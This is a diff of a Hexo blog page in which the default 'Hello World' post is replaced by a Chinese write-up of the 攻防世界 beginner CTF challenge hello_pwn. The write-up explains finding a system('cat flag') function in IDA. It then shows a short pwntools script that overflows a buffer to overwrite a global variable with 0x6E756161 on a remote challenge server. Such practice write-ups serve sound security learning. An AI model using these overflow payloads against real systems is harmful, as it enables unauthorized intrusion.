@@ -6,18 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | HandsomeJack</title>
+  <title>第一次用Markdown | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
-<meta name="keywords" content="随笔">
+  <meta name="description" content="[攻防世界]新手区hello_pwn先放进linux里看一下有无保护">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;01&#x2F;hello-world&#x2F;index.html">
+<meta property="og:title" content="第一次用Markdown">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta property="og:description" content="[攻防世界]新手区hello_pwn先放进linux里看一下有无保护">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-01-18T13:02:08.369Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;e.png">
+<meta property="og:updated_time" content="2020-01-31T02:41:10.002Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;31&#x2F;hello_pwn&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -182,41 +188,34 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-hello_pwn" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      第一次用Markdown
     </h1>
   
 
         
-        <a href="/2019/11/01/hello-world/" class="archive-article-date">
-  	<time datetime="2019-11-01T05:58:49.047Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-01</time>
+        <a href="/2020/01/31/hello_pwn/" class="archive-article-date">
+  	<time datetime="2020-01-31T02:27:26.490Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-31</time>
 </a>
         
       </header>
-<div align="center" class="post-count">字数：73字 | 预计阅读时长：1分钟</div>
+<div align="center" class="post-count">字数：204字 | 预计阅读时长：1分钟</div>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+        <h1 id="攻防世界-新手区hello-pwn"><a href="#攻防世界-新手区hello-pwn" class="headerlink" title="[攻防世界]新手区hello_pwn"></a>[攻防世界]新手区hello_pwn</h1><p>先放进linux里看一下有无保护<br><img src="a.png" alt="额"></p>
 <a id="more"></a>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>用64位IDA打开，先看字符串窗口，看看有没有可以利用的字符串<br><img src="b.png" alt="在这里插入图片描述"><br>发现可以有system和cat flag，组合使用可以直接拿到flag，点进去看看<br><img src="c.png" alt="在这里插入图片描述"><br>发现在sub_400686函数里，并且可以直接用<br><img src="d.png" alt="在这里插入图片描述"><br><img src="e.png" alt="在这里插入图片描述"><br>而主函数里调用该函数条件是dword_60106C等于0x6E756161，且read存在溢出漏洞，<strong>栈溢出是向高地址溢出</strong>，所以可以由601068溢出来覆盖60106C。</p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>让unk_601068溢出，覆盖dword_60106C的值为0x6E756161，来使main的if判断成立，调用sub_400686函数，得到flag。</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">'111.198.29.45'</span>,<span class="number">40481</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> + p64(<span class="number">0x6E756161</span>)</span><br><span class="line"><span class="comment">#地址0x00601068到0x0060106C的偏移是4，所以填充4个字符；由于是64位程序，所以用p64打包</span></span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
       
 
@@ -251,7 +250,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -307,7 +306,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2019/11/01/hello-world/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/01/31/hello_pwn/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -321,15 +320,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/01/18/test/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          第一次用Markdown
-        
-      </div>
-    </a>
   
+    <a href="/2020/01/18/test/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">第一次用Markdown</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
@@ -354,7 +349,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-新手区hello-pwn"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]新手区hello_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
